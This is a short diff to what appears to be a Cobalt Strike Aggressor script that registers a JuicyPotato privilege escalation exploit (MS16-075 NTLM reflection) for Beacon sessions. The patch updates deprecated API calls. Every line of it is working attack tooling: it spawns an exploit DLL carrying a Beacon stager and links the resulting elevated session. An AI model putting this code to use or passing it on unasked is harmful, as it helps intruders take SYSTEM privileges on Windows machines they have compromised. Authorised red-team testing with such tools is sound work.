@@ -10,11 +10,11 @@ sub juicypotato {
         $dll = "JuicyPotato.x32.dll";
     }
 
-    $stager = shellcode($2, false, $arch);
+    $stager = payload($2, $arch);
 
     bdllspawn!($1, script_resource($dll), $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
     
-    bstage($1, $null, $2, $arch);
+    beacon_link($1, $null, $2);
 }
 
 beacon_exploit_register("juicypotato", "JuicyPotato (ms16-075)", &juicypotato);
